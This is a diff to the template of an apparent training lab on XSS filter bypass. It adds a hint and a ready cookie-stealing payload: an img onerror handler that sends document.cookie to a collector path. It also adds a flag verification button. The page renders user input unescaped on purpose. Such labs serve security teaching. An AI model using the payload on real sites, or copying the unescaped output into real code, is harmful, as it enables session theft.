@@ -20,7 +20,30 @@
         Welcome, <%- filtered %>!
       </div>
     <% } %>
+    <p class="lab-meta" style="margin-top:0.8rem;">The filter removes literal <code>&lt;script&gt;</code> tags only. Use another executable element that sends the proof cookie to the collector.</p>
+    <pre class="lab-code">&lt;img src=x onerror="fetch('/labs/xss-filter-bypass/collect?p='+encodeURIComponent(document.cookie))"&gt;</pre>
   </div>
 
+  <div class="lab-card">
+    <h2>Verification</h2>
+    <button type="button" class="secondary" id="checkFilter">Check verification</button>
+    <pre class="lab-code" id="filterResult" style="margin-top:0.8rem;">Not checked yet.</pre>
+  </div>
+
+  <form method="POST" action="/labs/xss-filter-bypass/reset"><button type="submit" class="secondary">Reset lab</button></form>
+</div>
+<script>
+  document.getElementById('checkFilter').addEventListener('click', async function () {
+    const out = document.getElementById('filterResult');
+    try {
+      const response = await fetch('/labs/xss-filter-bypass/status');
+      const data = await response.json();
+      out.textContent = JSON.stringify(data, null, 2);
+      if (data.flag) out.textContent += '\n\nFLAG: ' + data.flag;
+    } catch (error) {
+      out.textContent = 'Status check failed: ' + error.message;
+    }
+  });
+</script>
 </body>
 </html>
